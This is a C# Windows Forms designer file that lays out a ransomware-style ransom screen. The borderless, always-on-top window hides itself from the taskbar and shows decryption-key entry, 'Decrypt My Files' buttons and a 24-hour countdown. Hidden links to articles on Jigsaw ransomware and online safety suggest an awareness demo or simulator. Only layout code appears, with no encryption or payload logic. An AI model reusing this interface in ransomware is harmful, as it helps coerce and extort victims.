namespace Runsome
{
    partial class frmMain
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
            this.btnDecrypt = new System.Windows.Forms.Button();
            this.txtDecryptKey = new System.Windows.Forms.TextBox();
            this.lblMessage = new System.Windows.Forms.Label();
            this.tmrMessage = new System.Windows.Forms.Timer(this.components);
            this.btnEncFiles = new System.Windows.Forms.Button();
            this.btnGetKey = new System.Windows.Forms.Button();
            this.linkJR = new System.Windows.Forms.LinkLabel();
            this.linkSSO = new System.Windows.Forms.LinkLabel();
            this.gbDecryption = new System.Windows.Forms.GroupBox();
            this.lblTimeR = new System.Windows.Forms.Label();
            this.tmrClock = new System.Windows.Forms.Timer(this.components);
            this.gbDecryption.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnDecrypt
            // 
            this.btnDecrypt.Enabled = false;
            this.btnDecrypt.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btnDecrypt.Location = new System.Drawing.Point(6, 45);
            this.btnDecrypt.Name = "btnDecrypt";
            this.btnDecrypt.Size = new System.Drawing.Size(278, 39);
            this.btnDecrypt.TabIndex = 0;
            this.btnDecrypt.Text = "Decrypt My Files";
            this.btnDecrypt.UseVisualStyleBackColor = true;
            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
            // 
            // txtDecryptKey
            // 
            this.txtDecryptKey.Location = new System.Drawing.Point(5, 19);
            this.txtDecryptKey.Name = "txtDecryptKey";
            this.txtDecryptKey.Size = new System.Drawing.Size(279, 20);
            this.txtDecryptKey.TabIndex = 1;
            this.txtDecryptKey.Text = "Enter your decryption key...";
            this.txtDecryptKey.MouseClick += new System.Windows.Forms.MouseEventHandler(this.txtDecryptKey_MouseClick);
            // 
            // lblMessage
            // 
            this.lblMessage.AutoSize = true;
            this.lblMessage.BackColor = System.Drawing.Color.Transparent;
            this.lblMessage.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblMessage.ForeColor = System.Drawing.Color.Lime;
            this.lblMessage.Location = new System.Drawing.Point(10, 9);
            this.lblMessage.Name = "lblMessage";
            this.lblMessage.Size = new System.Drawing.Size(0, 16);
            this.lblMessage.TabIndex = 2;
            this.lblMessage.MouseEnter += new System.EventHandler(this.lblMessage_MouseEnter);
            this.lblMessage.MouseLeave += new System.EventHandler(this.lblMessage_MouseLeave);
            // 
            // tmrMessage
            // 
            this.tmrMessage.Enabled = true;
            this.tmrMessage.Interval = 30;
            this.tmrMessage.Tick += new System.EventHandler(this.tmrMessage_Tick);
            // 
            // btnEncFiles
            // 
            this.btnEncFiles.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btnEncFiles.Location = new System.Drawing.Point(417, 19);
            this.btnEncFiles.Name = "btnEncFiles";
            this.btnEncFiles.Size = new System.Drawing.Size(259, 32);
            this.btnEncFiles.TabIndex = 4;
            this.btnEncFiles.Text = "List of Encrypted Files";
            this.btnEncFiles.UseVisualStyleBackColor = true;
            this.btnEncFiles.Click += new System.EventHandler(this.btnEncFiles_Click);
            // 
            // btnGetKey
            // 
            this.btnGetKey.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btnGetKey.Location = new System.Drawing.Point(417, 52);
            this.btnGetKey.Name = "btnGetKey";
            this.btnGetKey.Size = new System.Drawing.Size(259, 32);
            this.btnGetKey.TabIndex = 5;
            this.btnGetKey.Text = "Get My Decryption Key";
            this.btnGetKey.UseVisualStyleBackColor = true;
            this.btnGetKey.Click += new System.EventHandler(this.btnGetKey_Click);
            // 
            // linkJR
            // 
            this.linkJR.AutoSize = true;
            this.linkJR.BackColor = System.Drawing.Color.Transparent;
            this.linkJR.Font = new System.Drawing.Font("Arial Narrow", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.linkJR.LinkColor = System.Drawing.Color.Lime;
            this.linkJR.Location = new System.Drawing.Point(15, 421);
            this.linkJR.Name = "linkJR";
            this.linkJR.Size = new System.Drawing.Size(256, 23);
            this.linkJR.TabIndex = 6;
            this.linkJR.TabStop = true;
            this.linkJR.Text = "Article on: Jigsaw Ransomeware";
            this.linkJR.Visible = false;
            this.linkJR.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkJR_LinkClicked);
            // 
            // linkSSO
            // 
            this.linkSSO.AutoSize = true;
            this.linkSSO.BackColor = System.Drawing.Color.Transparent;
            this.linkSSO.Font = new System.Drawing.Font("Arial Narrow", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.linkSSO.LinkColor = System.Drawing.Color.Lime;
            this.linkSSO.Location = new System.Drawing.Point(456, 421);
            this.linkSSO.Name = "linkSSO";
            this.linkSSO.Size = new System.Drawing.Size(238, 23);
            this.linkSSO.TabIndex = 7;
            this.linkSSO.TabStop = true;
            this.linkSSO.Text = "Article on: Staying Safe Online";
            this.linkSSO.Visible = false;
            this.linkSSO.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkSSO_LinkClicked);
            // 
            // gbDecryption
            // 
            this.gbDecryption.BackColor = System.Drawing.Color.Transparent;
            this.gbDecryption.Controls.Add(this.btnDecrypt);
            this.gbDecryption.Controls.Add(this.txtDecryptKey);
            this.gbDecryption.Controls.Add(this.btnGetKey);
            this.gbDecryption.Controls.Add(this.btnEncFiles);
            this.gbDecryption.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.gbDecryption.Location = new System.Drawing.Point(13, 447);
            this.gbDecryption.Name = "gbDecryption";
            this.gbDecryption.Size = new System.Drawing.Size(681, 94);
            this.gbDecryption.TabIndex = 8;
            this.gbDecryption.TabStop = false;
            this.gbDecryption.Text = "Decryption";
            this.gbDecryption.Visible = false;
            // 
            // lblTimeR
            // 
            this.lblTimeR.AutoSize = true;
            this.lblTimeR.BackColor = System.Drawing.Color.Transparent;
            this.lblTimeR.Font = new System.Drawing.Font("Arial", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblTimeR.ForeColor = System.Drawing.Color.Red;
            this.lblTimeR.Location = new System.Drawing.Point(549, 372);
            this.lblTimeR.Name = "lblTimeR";
            this.lblTimeR.Size = new System.Drawing.Size(145, 37);
            this.lblTimeR.TabIndex = 9;
            this.lblTimeR.Text = "24:00:00";
            this.lblTimeR.Visible = false;
            // 
            // tmrClock
            // 
            this.tmrClock.Interval = 1000;
            this.tmrClock.Tick += new System.EventHandler(this.tmrClock_Tick);
            // 
            // frmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.ClientSize = new System.Drawing.Size(706, 553);
            this.ControlBox = false;
            this.Controls.Add(this.lblTimeR);
            this.Controls.Add(this.linkSSO);
            this.Controls.Add(this.linkJR);
            this.Controls.Add(this.lblMessage);
            this.Controls.Add(this.gbDecryption);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "frmMain";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.gbDecryption.ResumeLayout(false);
            this.gbDecryption.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button btnDecrypt;
        private System.Windows.Forms.TextBox txtDecryptKey;
        private System.Windows.Forms.Label lblMessage;
        private System.Windows.Forms.Timer tmrMessage;
        private System.Windows.Forms.Button btnEncFiles;
        private System.Windows.Forms.Button btnGetKey;
        private System.Windows.Forms.LinkLabel linkJR;
        private System.Windows.Forms.LinkLabel linkSSO;
        private System.Windows.Forms.GroupBox gbDecryption;
        private System.Windows.Forms.Label lblTimeR;
        private System.Windows.Forms.Timer tmrClock;
    }
}